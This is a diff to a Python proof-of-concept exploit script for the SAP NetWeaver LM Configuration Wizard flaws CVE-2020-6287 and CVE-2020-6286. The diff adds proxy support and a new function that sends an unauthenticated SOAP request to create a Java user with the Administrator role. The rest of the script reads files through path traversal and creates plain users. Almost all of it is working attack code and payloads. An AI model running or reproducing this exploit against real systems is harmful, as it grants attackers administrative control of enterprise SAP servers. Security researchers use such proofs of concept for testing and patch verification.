@@ -14,6 +14,10 @@ This scrip allows to check SAP LM Configuration Wizard missing authorization che
 Original finding: 
 - Pablo Artuso. https://twitter.com/lmkalg
 - Yvan 'iggy' G https://twitter.com/_1ggy
+
+Thanks:
+- Spencer McIntyre https://twitter.com/zeroSteiner
+
 Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665
 '''
 
@@ -23,7 +27,7 @@ def detect_vuln(base_url):
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC"}
     status = 'OK'
     checks =  {"name":"Check1","path":"/CTCWebService/CTCWebServiceBean","sign_status":200}
-    ans = requests.head(base_url + checks['path'], headers=headers, timeout=timeout, allow_redirects=False, verify=False)
+    ans = requests.head(base_url + checks['path'], headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
     status_code = ans.status_code
     is_vulnerable = False
     ret_url=''
@@ -52,7 +56,7 @@ def exploit_traversal(url, zipfile):
    </soapenv:Body>
 </soapenv:Envelope>
     ''' % (zipfile.replace(".zip",""))
-    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
+    ans = requests.post(url, headers=headers, proxies=proxies, timeout=timeout, data=xml, verify=False)
     if ans.status_code == 200:
         myroot = ET.fromstring(ans.content)
         zipb64 = ''
@@ -75,6 +79,47 @@ def generate_CreateUser_paylod():
     password = "Secure!PwD%d" % (random.randint(5000, 10000))
     p = "<root><user><JavaOrABAP>java</JavaOrABAP><username>%s</username><password>%s</password><userType>J</userType></user></root>" % (username, password)
     print("Going to create new user. %s:%s" % (username, password))
+    return base64.b64encode(p.encode('utf-8')).decode('utf-8')
+
+def generate_CreateAdmUser_paylod():
+    username = "sapRpoc%d" % (random.randint(5000, 10000))
+    password = "Secure!PwD%d" % (random.randint(5000, 10000))
+    Rand_val = "ThisIsRnd%d" % (random.randint(5000, 10000))
+    p = '''
+            <PCK>
+            <Usermanagement>
+              <SAP_XI_PCK_CONFIG>
+                <roleName>Administrator</roleName>
+              </SAP_XI_PCK_CONFIG>
+              <SAP_XI_PCK_COMMUNICATION>
+                <roleName>%s</roleName>
+              </SAP_XI_PCK_COMMUNICATION>
+              <SAP_XI_PCK_MONITOR>
+                <roleName>%s</roleName>
+              </SAP_XI_PCK_MONITOR>
+              <SAP_XI_PCK_ADMIN>
+                <roleName>%s</roleName>
+              </SAP_XI_PCK_ADMIN>
+              <PCKUser>
+                <userName secure="true">%s</userName>
+                <password secure="true">%s</password>
+              </PCKUser>
+              <PCKReceiver>
+                <userName>%s</userName>
+                <password secure="true">%s</password>
+              </PCKReceiver>
+              <PCKMonitor>
+                <userName>%s</userName>
+                <password secure="true">%s</password>
+              </PCKMonitor>
+              <PCKAdmin>
+                <userName>%s</userName>
+                <password secure="true">%s</password>
+              </PCKAdmin>
+            </Usermanagement>
+          </PCK>
+    ''' % (Rand_val, Rand_val, Rand_val, username, password, Rand_val, Rand_val, Rand_val, Rand_val, Rand_val, Rand_val)
+    print("Going to create new user %s:%s with role 'Administrator'" % (username, password))
     return base64.b64encode(p.encode('utf-8')).decode('utf-8')
 
 def exploit_createUser(url):
@@ -101,26 +146,70 @@ def exploit_createUser(url):
                </soapenv:Body>
             </soapenv:Envelope>
         ''' % (payload)
-    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
+    ans = requests.post(url, headers=headers, proxies=proxies, timeout=timeout, data=xml, verify=False)
     if ans.status_code == 200:
         print("Ok! User were created")
     else:
         print("Error! Can't create user. Status: %s" % (ans.status_code))
     return
 
+def exploit_add_role(url):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
+        "Content-Type": "text/xml;charset=UTF-8"}
+    payload = generate_CreateAdmUser_paylod()
+    xml = '''
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
+                <soapenv:Header/>
+                <soapenv:Body>
+                  <urn:executeSynchronious>
+                      <identifier>
+                        <component>sap.com/tc~lm~config~content</component>
+                        <path>content/Netweaver/PI_PCK/PCK/PCKProcess.cproc</path>
+                     </identifier>
+                     <contextMessages>
+                        <baData>
+                        %s
+                        </baData>
+                        <name>Netweaver.PI_PCK.PCK</name>
+                     </contextMessages>
+                  </urn:executeSynchronious>
+                 </soapenv:Body>
+              </soapenv:Envelope>
+        ''' % (payload)
+    try:
+        ans = requests.post(url, headers=headers, proxies=proxies, timeout=timeout, data=xml, verify=False)
+        if ans.status_code == 200:
+            print("Ok! Admin user were created")
+        else:
+            print("Error! Can't create user. Status: %s" % (ans.status_code))
+    except requests.exceptions.ReadTimeout:
+        print("Ok! Admin user were created")
+    return
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument('-H', '--host', default='127.0.0.1', help='Java NW host (default: 127.0.0.1)')
     parser.add_argument('-P', '--port', default=50000, type=int, help='Java NW web port (default: tcp/50000)')
+    parser.add_argument('-p', '--proxy', help='Use proxy (ex: 127.0.0.1:8080)')
     parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
     parser.add_argument('-c', '--check', action='store_true', help='just detect vulnerability')
     parser.add_argument('-f', '--zipfile', default='', help='ZIP file to read. CVE-2020-6286')
-    parser.add_argument('-u', '--user', action='store_true', help='Create JAVA user. CVE-2020-6287')
+    parser.add_argument('-u', '--user', action='store_true', help='Create simple JAVA user. CVE-2020-6287')
+    parser.add_argument('-a', '--admin', action='store_true', help='Create JAVA user with role "Administrator". CVE-2020-6287')
     parser.add_argument('--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
     parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
     args = parser.parse_args()
     timeout = args.timeout
 
+    proxies = {}
+    verify = True
+    if args.proxy:
+        verify = False
+        proxies = {
+            'http': args.proxy,
+            'https': args.proxy,
+        }
     if args.ssl:
         base_url = "https://%s:%s" % (args.host, args.port)
     else:
@@ -136,4 +225,7 @@ if __name__ == '__main__':
         result = detect_vuln(base_url)
         if result["status"]:
             exploit_createUser(result["url"].replace("?wsdl", ""))
-
+    if args.admin:
+        result = detect_vuln(base_url)
+        if result["status"]:
+            exploit_add_role(result["url"].replace("?wsdl", ""))
